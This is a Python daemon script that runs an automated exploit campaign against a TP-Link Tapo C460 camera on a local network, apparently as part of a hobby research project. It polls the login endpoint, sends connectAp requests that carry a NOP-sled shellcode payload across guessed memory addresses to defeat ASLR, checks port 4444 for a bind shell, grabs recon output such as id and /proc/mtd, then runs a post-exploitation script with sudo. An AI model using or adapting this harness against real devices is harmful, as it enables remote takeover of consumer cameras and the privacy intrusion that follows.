#!/opt/homebrew/bin/python3
"""C460 continuous burst daemon: single process, endless login-poll loop.
On DS-up: fires up to 12 addresses back-to-back, in-band shell grab,
auto-postshell. On shell: exits 0 (systemd/launchd KeepAlive restarts it
fresh for the next boot's ASLR). Heartbeats every 20 tries."""
import sys, time, json, struct, base64, socket, subprocess, os, datetime

sys.path.insert(0, "/Users/jemanuel/projects/franken_surveillance_system/deliverables/scripts")
os.chdir("/Users/jemanuel/projects/franken_surveillance_system")
import tapo_connectap_sc as T

HOST = os.environ.get("HOST", "192.168.4.243")
MAC = "50:3D:D1:E3:E2:07"
BASE = int(os.environ.get("BASE", "0xbef00000"), 16)
STEP = 0x400
LOG = "/tmp/c460_incremental_sweep.log"
STATE = "/tmp/c460_sweep_incremental.idx"
OFFSET = int(os.environ.get("OFFSET", "1024"))
SLED = int(os.environ.get("SLED", "512"))

def log(m):
    with open(LOG, "a") as f:
        f.write(time.strftime("%H:%M:%S ") + m + "\n")


def emit(event, details):
    """Best-effort sweeper telemetry: one JSON line, sink failure never blocks."""
    try:
        os.makedirs("/var/lib/fss-telemetry", exist_ok=True)
        with open("/var/lib/fss-telemetry/sweeper-c460.jsonl", "a") as f:
            f.write(json.dumps({"ts": datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds"),
                                "cam": "c460", "event": event, "details": details},
                               separators=(",", ":")) + "\n")
    except OSError:
        pass

def login_once():
    """Detect an open door on ANY answer, then do the real handshake.

    A cold camera answers the first POST with -40407 (RSA key + nonce), not a stok, so a probe
    that requires stok never reports a window at all. Non-empty body == window; the RSA path in
    T.login then finishes inside the same window.
    """
    r = T.post(HOST, "/", {"method": "login", "params": {"cnonce": "", "encrypt_type": "3", "username": "admin"}}, timeout=3)
    if not r.strip():
        return None
    try:
        return T.login(HOST)
    except SystemExit:      # login gives up if the window dies mid-handshake
        return None

def grab_and_postshell():
    log("SHELL — in-band recon grab")
    try:
        s = socket.create_connection((HOST, 4444), timeout=5)
        s.settimeout(4)
        out = b""
        for c in (b"id\n", b"cat /proc/mtd\n", b"cat /proc/version\n"):
            s.sendall(c); time.sleep(1.5)
            try:
                while True:
                    d = s.recv(4096)
                    if not d: break
                    out += d
            except socket.timeout:
                pass
        s.close()
        os.makedirs(f"/tmp/pane1/{HOST}", exist_ok=True)
        with open(f"/tmp/pane1/{HOST}/recon_sweep.txt", "wb") as f:
            f.write(out)
        log(f"recon {len(out)}B saved")
    except Exception as e:
        log(f"grab err: {e}")
    subprocess.run(["sudo","-n","bash","deliverables/scripts/c460_postshell.sh",HOST], capture_output=True, timeout=180)
    log("postshell dispatched")

def try_sleep_off(sess, variants):
    """Ask for sleep-off; returns True when a shape is accepted.

    The window is freshest immediately after login, so the caller runs the two most likely
    shapes BEFORE firing and the rest after the burst.
    """
    for sm in variants:
        try:
            r = T.req(HOST, sess, sm, timeout=6)
        except BaseException as e:
            log(f"sleep-off {sm['method']} exc {type(e).__name__}")
            continue
        code = None
        try:
            code = r["result"]["responses"][0]["error_code"]
        except Exception:
            code = None
        log(f"sleep-off {sm['method']} {sm['params']} -> {code if code is not None else str(r)[:60]}")
        emit("sleep_off", {"method": sm["method"], "params": sm["params"], "code": code})
        if code == 0:
            log("sleep-off accepted")
            emit("sleep_off", {"accepted": True, "method": sm["method"]})
            return True
    return False


def main():
    if os.path.exists(STATE):
        idx = int(open(STATE).read().strip() or 0)
    else:
        idx = 0
    log(f"daemon start at index {idx}")
    tries = 0
    while True:
        stok = login_once()
        tries += 1
        if stok:
            log(f"DS UP (try {tries}) — disabling sleep + bursting from index {idx}")
            emit("ds_state", {"state": "up", "tries": tries, "idx": idx})
            sess = stok  # T.login returns the whole session (stok/seq/lsk/ivb)
            SO_FAST = (
                {"method": "battery_set_power_save", "params": {"cur_status": 0, "power_save": {"enable": False}}},
                {"method": "battery_set_power_save", "params": {"cur_status": 1, "power_save": 0}},
                {"method": "battery_set_power_save", "params": {"cur_status": "0", "power_save": "0"}},
                {"method": "battery_set_power_save", "params": {"power_save": {"enable": 0}}},
                {"method": "battery_set_power_save", "params": {"power_save": {"enabled": False}}},
                {"method": "battery_set_power_save", "params": {"power_save": 0}},
                {"method": "battery_set_power_save", "params": {"power_save": False}},
                {"method": "battery_set_power_supply_mode", "params": {"mode": "wired_always_on"}},
                {"method": "battery_set_power_supply_mode", "params": {"power_supply_mode": {"mode": 0}}},
                {"method": "battery_set_power_supply_mode", "params": {"power_supply_mode": 1}},
                {"method": "battery_set_power_save", "params": {}},
                {"method": "battery_set_power_save", "params": {"cur_status": 0}},
                {"method": "battery_set_power_save"},
            )
            SO_REST = ()
            if try_sleep_off(sess, SO_FAST):
                SO_REST = ()
            fired = 0
            while fired < 12:
                addr = BASE + idx * STEP
                try:
                    # build/params shell out to arm-none-eabi-as and can raise SystemExit,
                    # which is not an Exception — keep them inside the guard as well
                    b64 = T.build(OFFSET, None, addr, sled=SLED, padpc=1, prefix=b"", bare=False, hang=True)
                    body = {"method": "connectAp",
                            "params": T.connect_params(b64, "Aardvark", "00:00:00:00:00:00")}
                    T.req(HOST, sess, body, timeout=8)
                    log(f"{addr:#x} fired")
                    emit("fire", {"addr": hex(addr), "idx": idx})
                except BaseException as e:
                    log(f"{addr:#x} exc {type(e).__name__} {e}")
                # cheap shell probe between shots
                try:
                    s = socket.create_connection((HOST, 4444), timeout=1.5)
                    s.close()
                    log(f"SHELL at {addr:#x}")
                    emit("shell", {"addr": hex(addr), "outcome": "shell"})
                    grab_and_postshell()
                    with open(STATE, "w") as f: f.write(str(idx))
                    print(json.dumps({"result": "shell", "addr": hex(addr)}))
                    return
                except Exception:
                    pass
                with open(STATE, "w") as f: f.write(str(idx))
                idx += 1
                fired += 1
            # sleep-off last: it costs seconds, and the shots matter more than the reply
            # Ask for sleep-off WITH the session. The shell script posts all methods blind to
            # the unauthenticated endpoint; a real session turns this into an answerable call,
            # and a unit that accepts it stops flapping and stops the whole sweep.
            if SO_REST:
                try_sleep_off(sess, SO_REST)
            log("burst done (12) — back to polling")
            tries = 0
        else:
            if tries % 20 == 0:
                log(f"login wait: try {tries}, DS closed")
            time.sleep(1)

if __name__ == "__main__":
    main()
